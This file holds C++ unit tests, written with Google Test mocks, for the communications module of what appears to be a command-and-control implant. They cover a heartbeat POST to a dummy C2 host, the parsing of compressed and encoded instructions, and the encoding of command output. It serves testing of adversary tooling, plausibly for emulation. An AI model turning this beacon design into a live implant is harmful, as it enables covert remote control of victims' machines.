#include <gtest/gtest.h>
#include <gmock/gmock.h>
#include "comms.h"
#include "tchar.h"
#include <string>
#include <map>

#include "instruction.h"

#define TEST_BEACON_PATH "/"

using ::testing::_;
using ::testing::DoAll;
using ::testing::Invoke;
using ::testing::Return;
using ::testing::SaveArg;
using ::testing::SetArgPointee;
using ::testing::StrEq;
using ::testing::InSequence;

// Mock the wrapper functions for unit tests
class MockCommsWrapper : public comms::CommsHttpWrapperInterface {
public:
    virtual ~MockCommsWrapper() {}

    MOCK_METHOD5(InternetOpenWrapper, HINTERNET(
        LPCSTR  lpszAgent,
        DWORD   dwAccessType,
        LPCSTR  lpszProxy,
        LPCSTR  lpszProxyBypass,
        DWORD   dwFlags
    ));
    MOCK_METHOD1(InternetCloseHandleWrapper, BOOL(HINTERNET hInternet));
    MOCK_METHOD0(GetLastErrorWrapper, DWORD(void));
    MOCK_METHOD8(InternetConnectWrapper, HINTERNET(
        HINTERNET     hInternet,
        LPCSTR        lpszServerName,
        INTERNET_PORT nServerPort,
        LPCSTR        lpszUserName,
        LPCSTR        lpszPassword,
        DWORD         dwService,
        DWORD         dwFlags,
        DWORD_PTR     dwContext
    ));
    MOCK_METHOD8(HttpOpenRequestWrapper, HINTERNET(
        HINTERNET hConnect,
        LPCSTR    lpszVerb,
        LPCSTR    lpszObjectName,
        LPCSTR    lpszVersion,
        LPCSTR    lpszReferrer,
        LPCSTR* lplpszAcceptTypes,
        DWORD     dwFlags,
        DWORD_PTR dwContext
    ));
    MOCK_METHOD5(HttpSendRequestWrapper, BOOL(
        HINTERNET hRequest,
        LPCSTR    lpszHeaders,
        DWORD     dwHeadersLength,
        LPVOID    lpOptional,
        DWORD     dwOptionalLength
    ));
    MOCK_METHOD4(InternetReadFileWrapper, BOOL(
        HINTERNET hFile,
        LPVOID    lpBuffer,
        DWORD     dwNumberOfBytesToRead,
        LPDWORD   lpdwNumberOfBytesRead
    ));
};

// Test fixture for shared data
class CommsTest : public ::testing::Test {
protected:
    MockCommsWrapper mock_comms_wrapper;

    HINTERNET mock_h_inet = HINTERNET(1234);
    HINTERNET mock_h_session = HINTERNET(2345);
    HINTERNET mock_h_request = HINTERNET(3456);
    DWORD dummy_error = 123;

    //"ID = 01234567-89ab-cdef-ffffff"
    std::string mock_response_data = "<div>QlpoOTFBWSZTWd1WmrgAAAB9AFQAAAFAAn/iBCA/ACAAIiepPTUZMmyTI9CgAGgZMgDgETg2wukn3W3l1ZsTy2dJ9+rgj2LuSKcKEhuq01cA</div>";
    int mock_response_data_length = 67;
    const void* mock_response_data_ptr = mock_response_data.c_str();

    instruction::Instruction emptyInstruction;

    LPCSTR dummy_c2_address = "this.domain.does.not.exist";
    WORD dummy_c2_port = 100;

    LPCSTR dummy_accept_types[2] = { "*/*", NULL };
    const TCHAR* jsonHeader = _T("Content-Type: application/json");

};

// Define our own matching logic to compare accept_types array for HTTP requests
MATCHER_P2(AcceptTypesEq, target_accept_types, length, "") {
    for (int i = 0; i < length; i++) {
        if (target_accept_types[i] == NULL) {
            if (arg[i] == NULL) break;
            else return false;
        }
        if (strcmp(target_accept_types[i], arg[i]) != 0) return false;
    }
    return true;
}

MATCHER_P(ExeInstructionEq, pTarget, "") {
    return (pTarget.commandID == arg.commandID) &&
        (pTarget.payloadSize == arg.payloadSize) &&
        (pTarget.configSize == arg.configSize) &&
        (pTarget.config.size() == arg.config.size()) &&
        (pTarget.config == arg.config);
}

TEST_F(CommsTest, TestPerformHeartbeatSuccess) {
    LPVOID mock_buf;

    EXPECT_CALL(mock_comms_wrapper, InternetOpenWrapper(
        StrEq(DEFAULT_USER_AGENT),
        INTERNET_OPEN_TYPE_DIRECT,
        NULL,
        NULL,
        0
    )).Times(1).WillOnce(Return(mock_h_inet));

    EXPECT_CALL(mock_comms_wrapper, InternetConnectWrapper(
        mock_h_inet,
        StrEq(dummy_c2_address),
        dummy_c2_port,
        NULL,
        NULL,
        INTERNET_SERVICE_HTTP,
        0,
        (DWORD_PTR)NULL
    )).Times(1).WillOnce(Return(mock_h_session));

    EXPECT_CALL(mock_comms_wrapper, HttpOpenRequestWrapper(
        mock_h_session,
        StrEq("POST"),
        StrEq(HEARTBEAT_PATH),
        NULL,
        NULL,
        AcceptTypesEq(dummy_accept_types, 2),
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE,
        (DWORD_PTR)NULL
    )).Times(1).WillOnce(Return(mock_h_request));

    EXPECT_CALL(mock_comms_wrapper, HttpSendRequestWrapper(
        mock_h_request,
        StrEq(jsonHeader),
        -1L,
        NULL,
        0
    )).Times(1).WillOnce(Return(TRUE));

    EXPECT_CALL(mock_comms_wrapper, InternetReadFileWrapper(
        mock_h_request,
        _,
        RESP_BUFFER_SIZE,
        _
    )).Times(2)
        .WillOnce(DoAll(
            SaveArg<1>(&mock_buf),
            Invoke([&]() { std::memcpy(mock_buf, mock_response_data_ptr, mock_response_data_length); }),
            SetArgPointee<3>(mock_response_data_length),
            Return(TRUE)))
        .WillOnce(DoAll(
            SetArgPointee<3>(0),
            Return(TRUE)));

    EXPECT_CALL(mock_comms_wrapper, InternetCloseHandleWrapper(mock_h_request))
        .Times(1)
        .WillOnce(Return(TRUE));
    EXPECT_CALL(mock_comms_wrapper, InternetCloseHandleWrapper(mock_h_session))
        .Times(1)
        .WillOnce(Return(TRUE));
    EXPECT_CALL(mock_comms_wrapper, InternetCloseHandleWrapper(mock_h_inet))
        .Times(1)
        .WillOnce(Return(TRUE));

    std::map<std::string, std::string> mock_config;
    mock_config["ID"] = "01234567-89ab-cdef-ffffff";
    instruction::Instruction mock_instruction{ 0, 0, std::vector<unsigned char>(), 30, mock_config };

    EXPECT_THAT(comms::PerformHeartbeat(&mock_comms_wrapper, dummy_c2_address, dummy_c2_port, NULL, 0),
        ExeInstructionEq(mock_instruction));

}

TEST_F(CommsTest, TestPerformHeartbeatFailReadResponse) {
    EXPECT_CALL(mock_comms_wrapper, InternetOpenWrapper(
        StrEq(DEFAULT_USER_AGENT),
        INTERNET_OPEN_TYPE_DIRECT,
        NULL,
        NULL,
        0
    )).Times(1).WillOnce(Return(mock_h_inet));

    EXPECT_CALL(mock_comms_wrapper, InternetConnectWrapper(
        mock_h_inet,
        StrEq(dummy_c2_address),
        dummy_c2_port,
        NULL,
        NULL,
        INTERNET_SERVICE_HTTP,
        0,
        (DWORD_PTR)NULL
    )).Times(1).WillOnce(Return(mock_h_session));

    EXPECT_CALL(mock_comms_wrapper, HttpOpenRequestWrapper(
        mock_h_session,
        StrEq("POST"),
        StrEq(HEARTBEAT_PATH),
        NULL,
        NULL,
        AcceptTypesEq(dummy_accept_types, 2),
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE,
        (DWORD_PTR)NULL
    )).Times(1).WillOnce(Return(mock_h_request));

    EXPECT_CALL(mock_comms_wrapper, HttpSendRequestWrapper(
        mock_h_request,
        StrEq(jsonHeader),
        -1L,
        NULL,
        0
    )).Times(1).WillOnce(Return(TRUE));

    EXPECT_CALL(mock_comms_wrapper, InternetReadFileWrapper(
        mock_h_request,
        _,
        RESP_BUFFER_SIZE,
        _
    )).Times(1)
        .WillOnce(Return(FALSE));

    EXPECT_CALL(mock_comms_wrapper, InternetCloseHandleWrapper(mock_h_request))
        .Times(1)
        .WillOnce(Return(TRUE));
    EXPECT_CALL(mock_comms_wrapper, InternetCloseHandleWrapper(mock_h_session))
        .Times(1)
        .WillOnce(Return(TRUE));
    EXPECT_CALL(mock_comms_wrapper, InternetCloseHandleWrapper(mock_h_inet))
        .Times(1)
        .WillOnce(Return(TRUE));
    EXPECT_CALL(mock_comms_wrapper, GetLastErrorWrapper())
        .Times(1)
        .WillOnce(Return(dummy_error));

    EXPECT_THAT(comms::PerformHeartbeat(&mock_comms_wrapper, dummy_c2_address, dummy_c2_port, NULL, 0),
        ExeInstructionEq(emptyInstruction)
    );
}

TEST_F(CommsTest, TestFormatRequestBody) {
    EXPECT_THAT(comms::FormatRequestBody("01234567-89ab-cdef-ffffff", "command", "I am output", false),
        "QlpoOTFBWSZTWQ8XSXwAACdfgBAAUAZ/8hQgOkA/Q8WqIABUYaGm1BkaNDTIA09AimnpBoDIxDJtQABHCAqW8h9MgG0gsqxtSq69bGNRE7MHwIBTKczg6huLPD1eiM7hBnc0gOuE4PJYV6YURF3JFOFCQDxdJfA=");
}
